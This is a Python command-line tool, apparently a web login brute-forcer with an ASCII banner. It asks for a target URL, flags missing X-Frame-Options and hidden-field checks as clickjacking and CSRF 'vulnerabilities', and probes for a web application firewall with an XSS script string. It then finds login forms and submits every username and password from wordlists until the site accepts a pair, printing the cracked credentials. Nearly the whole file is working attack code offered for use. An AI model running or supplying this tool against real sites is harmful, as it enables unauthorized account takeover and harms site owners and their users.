#!/usr/bin/env python3
# Modules
import mechanize
import itertools
import http.cookiejar as cookielib
import sys
from bs4 import BeautifulSoup
from re import search, findall
from urllib.request import urlopen
from urllib.error import URLError

# Mechanize browser setup
br = mechanize.Browser()
cookies = cookielib.LWPCookieJar()
br.set_cookiejar(cookies)
br.set_handle_equiv(True)
br.set_handle_redirect(True)
br.set_handle_referer(True)
br.set_handle_robots(False)
br.set_debug_http(False)
br.set_debug_responses(False)
br.set_debug_redirects(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
br.addheaders = [
    ('User-agent', 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1'),
    ('Accept', 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'),
    ('Accept-Encoding', 'br')
]

# Banner
print('''\033[1;93m
 ____  _ _____ _
/ ___|(_)_   _| |__  _   _
\___ \| | | | | '_ \| | | |
 ___) | | | | | | | | |_| |
|____/|_| |_| |_| |_|\__,_|
\033[1;34m
''')

# Get target URL
url = input('\033[1;34m[?]\033[0m Enter target URL: ')
if 'http://' not in url and 'https://' not in url:
    url = 'http://' + url

# Open URL
try:
    br.open(url, timeout=10.0)
except URLError:
    url = 'https://' + url
    br.open(url)

forms = br.forms()
headers = str(urlopen(url).headers).lower()
if 'x-frame-options:' not in headers:
    print('\033[1;32m[+]\033[0m Heuristic found a Clickjacking Vulnerability')
if 'cloudflare-nginx' in headers:
    print('\033[1;31m[-]\033[0m Target is protected by Cloudflare')

data = br.open(url).read().decode('utf-8')
if 'type="hidden"' not in data:
    print('\033[1;32m[+]\033[0m Heuristic found a CSRF Vulnerability')

soup = BeautifulSoup(data, 'lxml')
i_title = soup.find('title')
original = i_title.contents if i_title else None

# WAF detection function
def WAF_detector():
    noise = "?=<script>alert()</script>"
    fuzz = url + noise
    res1 = urlopen(fuzz)
    if res1.code == 406 or res1.code == 501:
        print("\033[1;31m[-]\033[1;m WAF Detected : Mod_Security")
    elif res1.code == 999:
        print("\033[1;31m[-]\033[1;m WAF Detected : WebKnight")
    elif res1.code == 419:
        print("\033[1;31m[-]\033[1;m WAF Detected : F5 BIG IP")
    elif res1.code == 403:
        print("\033[1;31m[-]\033[1;m Unknown WAF Detected")

WAF_detector()

# Load wordlists
def wordlist_u(lst):
    try:
        with open('usernames.txt', 'r') as f:
            for line in f:
                lst.append(line.strip())
    except IOError:
        print("\033[1;31m[-]\033[1;m Wordlist not found!")
        quit()

def wordlist_p(lst):
    try:
        with open('passwords.txt', 'r') as f:
            for line in f:
                lst.append(line.strip())
    except IOError:
        print("\033[1;31m[-]\033[1;m Wordlist not found!")
        quit()

usernames = []
wordlist_u(usernames)
print('\033[1;97m[>]\033[1;m Usernames loaded: %i' % len(usernames))
passwords = []
wordlist_p(passwords)
print('\033[1;97m[>]\033[1;m Passwords loaded: %i' % len(passwords))

# Find and brute force forms
def find():
    form_number = 0
    for f in forms:
        data = str(f)
        username = search(r'<TextControl\([^<]*=\)>', data)
        if username:
            username = username.group().split('<TextControl(')[1][:-3]
            print('\033[1;33m[!]\033[0m Username field: ' + username)
            passwd = search(r'<PasswordControl\([^<]*=\)>', data)
            if passwd:
                passwd = passwd.group().split('<PasswordControl(')[1][:-3]
                print('\033[1;33m[!]\033[0m Password field: ' + passwd)
                select_n = search(r'SelectControl\([^<]*=', data)
                if select_n:
                    name = select_n.group().split('(')[1][:-1]
                    select_o = search(r'SelectControl\([^<]*=[^<]*\)>', data)
                    menu = "True" if select_o else "False"
                    options = select_o.group().split('=')[1][:-1] if select_o else ""
                    print('\n\033[1;33m[!]\033[0m A drop-down menu detected.')
                    print('\033[1;33m[!]\033[0m Menu name: ' + name)
                    print('\033[1;33m[!]\033[0m Options available: ' + options)
                    option = input('\033[1;34m[?]\033[0m Please select an option:>> ')
                    brute(username, passwd, menu, option, name, form_number)
                else:
                    brute(username, passwd, "False", "", "", form_number)
            else:
                form_number += 1
        else:
            form_number += 1
    print('\033[1;31m[-]\033[0m No forms found')

def cannotUseBruteForce(username, e):
    print('\r\033[1;31m[!]\033[0m Cannot use brute force with user %s.' % username)
    print('\r    [Error: %s]' % str(e))

def brute(username, passwd, menu, option, name, form_number):
    for uname in usernames:
        print('\033[1;97m[>]\033[1;m Bruteforcing username: %s' % uname)
        for i, password in enumerate(passwords, 1):
            sys.stdout.write('\r\033[1;97m[>]\033[1;m Passwords tried: %i / %i' % (i, len(passwords)))
            sys.stdout.flush()
            br.open(url)
            br.select_form(nr=form_number)
            br.form[username] = uname
            br.form[passwd] = password
            if menu == "True":
                br.form[name] = [option]
            resp = br.submit()
            data = resp.read().decode('utf-8')
            if 'username or password' not in data.lower():
                print('\n\033[1;32m[+]\033[0m Valid credentials found:')
                print('\033[1;32mUsername: \033[0m' + uname)
                print('\033[1;32mPassword: \033[0m' + password)
                quit()

    print('\033[1;31m[-]\033[0m Failed to crack login credentials')

find()
